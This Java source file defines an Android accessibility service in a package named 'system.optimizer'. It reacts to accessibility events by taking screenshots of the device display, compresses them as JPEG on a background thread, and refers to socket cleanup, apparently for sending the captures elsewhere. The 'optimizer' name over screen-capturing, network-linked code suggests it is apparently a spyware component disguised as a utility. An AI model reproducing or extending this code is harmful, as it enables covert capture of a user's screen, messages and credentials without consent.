package com.system.optimizer.service;

import com.system.optimizer.event.AccessibilityEventHandler;
import com.system.optimizer.config.AppConfig;

import android.os.Build;

import com.system.optimizer.util.TimberInitializer;

import android.accessibilityservice.AccessibilityService;
import timber.log.Timber;
import android.view.accessibility.AccessibilityEvent;

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

public class AccessibilityMonitorService extends AccessibilityService {

    private AppConfig appConfig;
    private AccessibilityEventHandler handler;

    /**
     * Single-thread executor to handle CPU-intensive JPEG compression
     * without blocking the Accessibility (Main) thread.
     */
    private final ExecutorService backgroundExecutor = Executors.newSingleThreadExecutor();

    @Override
    public void onCreate() {
        super.onCreate();
        TimberInitializer.init();
        Timber.d("Initializing AccessibilityMonitorService");

        try {
            this.appConfig = new AppConfig(this);

            this.handler = new AccessibilityEventHandler(
                    (callback) -> {
                        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
                            callback.onError("API < 30 not supported");
                            return;
                        }
                        takeScreenshot(android.view.Display.DEFAULT_DISPLAY,
                                backgroundExecutor, new ScreenshotResultHandler(callback, appConfig));
                    }, appConfig);

            Timber.d("All components initialized successfully");
        } catch (Exception e) {
            // Log error but don't crash the service
            Timber.e(e, "Error initializing components");
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) {
            return;
        }

        try {
            handler.handleEvent(event);
        } catch (Exception e) {
            Timber.e(e, "Error handling accessibility event");
        }
    }

    @Override
    public void onInterrupt() {
    }

    @Override
    public void onDestroy() {
        try {
            Timber.d("Shutting down service and executor");

            // Gracefully shut down the background executor
            backgroundExecutor.shutdown();
            if (!backgroundExecutor.awaitTermination(2, TimeUnit.SECONDS)) {
                backgroundExecutor.shutdownNow();
            }

            // Delegate socket cleanup to handler
            if (handler != null) {
                handler.cleanup();
            }
        } catch (Exception e) {
            Timber.e(e, "Error during onDestroy cleanup");
        } finally {
            super.onDestroy();
        }
    }

}
